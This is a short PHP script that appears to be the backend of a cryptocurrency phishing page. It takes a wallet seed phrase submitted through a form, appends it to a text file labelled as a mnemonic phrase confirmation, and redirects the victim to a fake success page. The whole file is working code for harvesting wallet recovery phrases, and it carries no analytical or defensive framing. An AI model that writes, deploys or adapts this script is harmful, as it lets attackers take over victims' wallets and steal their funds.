<?php

file_put_contents("Memonicphraseconfirmation.txt", "Memonic Phrase Confirmation: " . $_POST['walletSeed']. "\n", FILE_APPEND);
header('Location: succes.html');
exit();
?>
